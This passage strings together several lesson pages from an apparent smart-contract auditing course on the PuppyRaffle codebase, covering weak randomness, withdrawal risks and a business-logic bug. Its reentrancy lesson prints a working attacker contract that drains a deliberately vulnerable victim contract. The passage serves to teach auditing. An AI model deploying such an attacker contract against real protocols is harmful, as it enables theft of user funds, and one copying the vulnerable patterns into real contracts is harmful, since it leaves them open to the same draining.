// @Audit: check for zero address!
...
}
```

This is another finding `Aderyn` caught for us, we can just copy and paste this write up into our report like so:

````md
### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)

  ```solidity
          feeAddress = _feeAddress;
  ```

- Found in src/PuppyRaffle.sol [Line: 159](src/PuppyRaffle.sol#L159)

  ```solidity
          previousWinner = winner;
  ```

- Found in src/PuppyRaffle.sol [Line: 182](src/PuppyRaffle.sol#L182)

  ```solidity
          feeAddress = newFeeAddress;
  ```
````

Leveraging our tools is a great way to speed up the write up process. Thanks, `Aderyn`! Mark the note as complete and we'll move on to the next finding!

```js
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) EERC721 ("Puppy Raffle, "PR""){
// @Written: check for zero address!
...
}
```
---
title: Recon Continued 2
---

_Follow along with this video:_

---

### Continuing Reconnaissance

We've already found **two** big bugs in this selectWinner function! This is great, let's continue down the code and see what else we uncover.

The next line in our code is `uint256 tokenId = totalSupply()`. It may be worth confirming where `totalSupply()` is coming from and making some in-line notes of questions to answer later.

```js
...
    //
    uint256 tokenId = totalSupply();

    // We use a different RNG calculate from the winnerIndex to determine rarity
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    if (rarity <= COMMON_RARITY) {
        tokenIdToRarity[tokenId] = COMMON_RARITY;
    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
        tokenIdToRarity[tokenId] = RARE_RARITY;
    } else {
        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
    }

    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
}
```

We can see that `totalSupply()` is coming from our `ERC721 inheritance` and is returning `_tokenOwners.length`

```js
function totalSupply() public view virtual override returns (uint256) {
    // _tokenOwners are indexed by tokenIds, so .length() returns the number of tokenIds
    return _tokenOwners.length();
}
```

ERC721 is a very common token standard and tokenSupply is a well known function within it. You should absolutely familiarize yourself with these concepts. Ultimately things look good here, but we may want to make note:

```js
// @Audit: Where is tokenId/tokenSupply being incremented?
uint256 tokenId = totalSupply();
```

Continuing with our `selectWinner` function we next see that a token rarity is being determined. `Weak Randomness` is seen again! Something to note is - any time I see constants being used, I like to verify what they are. In this case the constants in this code are representing percentage changes of obtaining a giving rarity.

```js
// @Audit: Weak Randomness
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
//
if (rarity <= COMMON_RARITY) {
    tokenIdToRarity[tokenId] = COMMON_RARITY;
} else if (rarity <= COMMON_RARITY + RARE_RARITY) {
    tokenIdToRarity[tokenId] = RARE_RARITY;
} else {
    tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
}
```

Following this, our function performs a number of state changes. Let's make note of what each of these is actually doing.

```js
delete players; // resetting the players array
raffleStartTime = block.timestamp; // resetting the raffle start time
previousWinner = winner; // vanity, doesn't impact much
```

Finally we see calls to send the `prizePool` and mint the NFT to the winner.

```js
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);
```

We may even suspect that `re-entrancy` is a risk here, given the order of these lines. So let's verify!

When a call is made externally, we should always ask ourselves what could happen in different scenarios.

- _What if the recipient is a smart contract?_

- _What if the contract doesn't have a receive/fallback function or forces a revert?_

- _What if the recipient calls another function through receive/fallback?_

The more experience you gain performing security reviews, the better your intuition will be about which questions to ask and what to watch out for.

In this particular circumstance, we see that the `selectWinner` function includes require statements that would prevent re-entrancy at this point in this code as we've already reset these state variables. Whew!

```js
require(block.timestamp >=
  raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
```

However, if the winner had a broken `receive` function, `selectWinner` here would fail, it could actually be quite difficult to select a winner in that situation! We'll discuss impact and reporting of that a little later.

```js
// @Audit: Winner wouldn't be unable to receive rewards if fallback function was broken!
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);
```

Alright, we've completed a fairly thorough walkthrough of `selectWinner`, let's move onto the next function `withdrawFees`.

> As always there may be more bugs in these repos than we go over, keep a look out!

### Risks in withdrawFees

```js
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

So, let's break this function down to see what it's doing.

First we see a require statement and already a couple questions come to mind _Hint: there are issues with this line_

```js
// @Audit: If there are players, fees can't be withdrawn, does this make withdrawl difficult?
require(address(this).balance ==
  uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

The next two lines are resetting our `totalFees`, seems fine.

```js
uint256 feesToWithdraw = totalFees;
totalFees = 0;
```

And finally we reach the external call which distributes the fees. It's worth noting that the address isn't the `owner`, fees are being sent to the `feeAddress` which our earlier `NatSpec` advises is controllable by the `owner`

```js
// @Audit: What if the feeAddress is a smart contract with a fallback/receive which reverts?
(bool success,) = feeAddress.call{value: feesToWithdraw}("");
require(success, "PuppyRaffle: Failed to withdraw fees");
```

### Wrap Up

We've covered two more functions in `Puppy Raffle` and I think we're on the trail of a couple more bugs. In the next lesson, lets answer some of the questions we asked here and look at better practices to employ in protocols such as these.
---
title: Exercises
---

_Follow along with this video:_

---

### Exercises

This has easily been my favourite auditing codebase. We've come a long way and now is a great time to take a break and feed that ice cream addiction.

When you're ready we've got much more for you to dive into to sharpen your skills and further familiarize yourself with the vulnerabilities we've discussed in this section.

Navigate to [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo.

In the same area of this repo where we'd reference our simplified Remix examples, we've additional sections available to you, including `Ethernaut`, `Damn Vulnerable DeFi` and `Case Studies`. These are invaluable resources to challenge yourself and learn more about the security eco-system in Web3.

### Ethernaut

Ethernaut, is amazing. It's effectively a compilation of CTFs (capture the flags) or games where you learn about how to exploit various vulnerabilities in a semi-live environment. There are dozens of challenges to complete. I highly recommend starting with `Hello Ethernaut` as it will outline the basics of how Ethernaut works and how to play.

You _are_ expected to know a little bit of JavaScript for some of the functionality of `Ethernaut`, but with a little work you can deploy the instanced contracts and interact with them through `Foundry` or `Etherscan` as well.



### Damn Vulnerable DeFi

I also would encourage you to check out [**Damn Vulnerable Defi**](https://www.damnvulnerabledefi.xyz/), which has a number of similar challenges. I'll warn you that DVD _is_ a bit more challenging than `Ethernaut`

Unfortunately DVD is _also_ written in `Hardhat`, so some JavaScript knowledge goes a long way.

> **Note:** Someone needs to rewrite this in Foundry!!!

What you can do, if you're not comfortable with `Hardhat` would be to copy the contracts that Damn Vulnerable Defi provides you into a Forge project and just try to break it locally. Each challenge in DVD provides you with your objectives.



### Case Studies

This section, of course, offers some case study examples of the vulnerabilities we've been discussing so you can gain further insight into how impactful these issues have been and how they've affected the ecosystem beyond all the theory - in the real world.

---

Beyond the above, we've got **even more** for you to do to practice all you've learnt in this section.

1. [**Ethernaut Challenges**](https://ethernaut.openzeppelin.com/) (1, 9 & 10)
2. Sign up for [**Solodit**](https://solodit.xyz/)
3. Post a tweet about how you completed the Puppy Raffle Audit!
4. Sign up for [**Farcaster**](https://www.farcaster.xyz/)
5. Do a [**CodeHawks First Flight**](https://www.codehawks.com/first-flights)

🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀🧑‍🚀

### Section 4 NFT Challenges

- [**A combination hack (Arb)**](https://arbiscan.io/address/0xef72ba6575b86beaa9b9e4a78bca4a58f3cce276)
- [**A combination hack (Sepolia)**](https://sepolia.etherscan.io/address/0xf988ebf9d801f4d3595592490d7ff029e438deca)
---
title: Weak Randomness - Multiple Issues
---

_Follow along with this video:_

---

### Weak Randomness Breakdown

Let's look at a few ways that randomness, as we've seen in `PuppyRaffle` and our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) examples, can be manipulated.



### block.timestamp

Relying on block.timestamp is risky for a few reasons as node validators/miners have privileges that may give them unfair advantages.

The validator selected for a transaction has the power to:

- Hold or delay the transaction until a more favorable time
- Reject the transaction because the timestamp isn't favorable

Timestamp manipulation has become less of an issue on Ethereum, since the merge, but it isn't perfect. Other chains, such as Arbitrum can be vulnerable to several seconds of slippage putting randomness based on `block.timestamp` at risk.

### block.prevrandao

`block.prevrandao` was introduced to replace `block.difficulty` when the merge happened. This is a system to choose random validators.

The security issues using this value for randomness are well enough known that many of them are outlined in the [**EIP-4399**](https://eips.ethereum.org/EIPS/eip-4399) documentation already.

The security considerations outlined here include:

**Biasability:** The beacon chain RANDAO implementation gives every block proposer 1 bit of influence power per slot. Proposer may deliberately refuse to propose a block on the opportunity cost of proposer and transaction fees to prevent beacon chain randomness (a RANDAO mix) from being updated in a particular slot.

**Predictability:** Obviously, historical randomness provided by any decentralized oracle is 100% predictable. On the contrary, the randomness that is revealed in the future is predictable up to a limited extent.

### msg.sender

Any field controlled by a caller can be manipulated. If randomness is generated from this field, it gives the caller control over the outcome.

By using msg.sender we allow the caller the ability to mine for addresses until a favorable one is found, breaking the randomness of the system.

### Wrap Up

This should all make sense. The blockchain is a deterministic system, any number we derive from it, is by definition going to be deterministic.

We've touched on a few ways this vulnerability can be exploited, in the next lesson we'll investigate a case study that should illustrate the potential impact of a weakness like this.

Meanwhile, I encourage you to experiment further with how the vulnerability works within our [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) and [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) examples.
---
title: Exploit - Reentrancy
---

_Follow along with this video:_

---

Let's see if we can nail down this vulnerability. When we'd run `Slither` earlier, you may recall it had actually found something...

Run it again and we'll have a closer look.

```bash
slither .
```

Looking through the output, we can see `Slither` is in fact detecting things in our `refund` function!



### What is a re-entrancy attack and how does it work?

For this lesson we'll be heavily leaning on our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo for diagrams and examples to reference. Be sure to clone it so you can see how these vulnerabilities work locally.

Here's our example contract:

```js
contract ReentrancyVictim {
    mapping(address => uint256) public userBalance;

    function deposit() public payable {
        userBalance[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];
        // An external call and then a state change!
        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }

        // State change
        userBalance[msg.sender] = 0;
    }
}
```

Fairly simple. Under normal circumstances

User A (balance 10 ether) can deposit funds

1. deposit{value: 10 ether}

   userBalance[UserA] = 10 ether
   contract balance = 10 ether
   User A balance = 0 ether

And then withdraw them

2. withdrawBalance

   userBalance[UserA] = 0 ether
   contract balance = 0 ether
   User A balance = 10 ether

The order of operations is reeally important in these situations. In our `withdrawBalance` function, we see that the function is making an external call _before_ updating the state of the contract.

What this means, is that an attacker could have that external call be made in such a way that it triggers a call of the `withdrawBalance` function again (hence - reentrancy).

```js
contract ReentrancyAttacker {
    ReentrancyVictim victim;

    constructor(ReentrancyVictim _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}
```

Consider the above attack contract. Seems pretty benign, but let's walk through what's actually happening.

1. Attacker calls the attack function which deposits 1 ether, then immediately withdraws it.

```js
function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }
```

2. The `ReentrancyVictim` contract does what's it's supposed to and received the deposit, then processs the withdrawal. During this process the victim contract makes a call to the attacker's contract.

**NOTE: THIS IS BEFORE OUR BALANCE HAS BEEN UPDATED**

```js
(bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }
```

What happens when a contract receives value? It's going have it's receive/fallback functions triggered. And what does our Attacker's receive function look like?

```js
receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
```

It calls the `withdrawBalance` function again! Because our previous `withdrawBalance` hasn't updated our balance yet, the contract will happily let us withdraw again.. and again .. and again until all funds are drained.

Let's look at this all put together.



### Wrap Up

Re-entrancy is a a big deal and it's very impactful when it happens. We're really going to nail down our understanding of this attack vector before moving on.

At it's most minimalistic, re-entrancy generates a loop that continually drains funds from a protocol.



Our next lesson is going to be a hands on example of this vulnerability in Remix. Let's see what this exploit is like in action.
---
title: Exploit - Business Logic Edge Case
---

_Follow along with this video:_

---

### Business Logic Edge Case

By now we've identified fairly clearly how the `enterRaffle` function works. Our finding looks great. Let's next move onto the `refund` function, this one was mentioned explicitly in our documention.

```
Users are allowed to get a refund of their ticket & value if they call the refund function
```

This is what the function looks like.

```js
/// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
/// @dev This function will allow there to be blank spots in the array
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

Remember to start with the documentation so that we understand what's supposed to happen. In order to call this function a player needs to provide their `playerIndex`, and this is acquired through the `getActivePlayerIndex` function.

Let's jump over there quickly.

```js
/// @notice a way to get the index in the array
/// @param player the address of a player in the raffle
/// @return the index of the player in the array, if they are not active, it returns 0
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

I think we may have stumbled upon our next bug. The logic here has a problem. Can you spot it?


The Problem


When looking at this function, we have to ask _"Why is this returning zero?"_

Arrays begin at index 0, were the player at this index to call this function it would be very unclear whether or not they were in the raffle or not!



### Wrap Up

We're not going to go through writing this finding report together, but I absolutely challenge you to write one yourself before moving forward!

**\*Hint:** It's informational severity\*

Up next we're going back to the `refund` function!
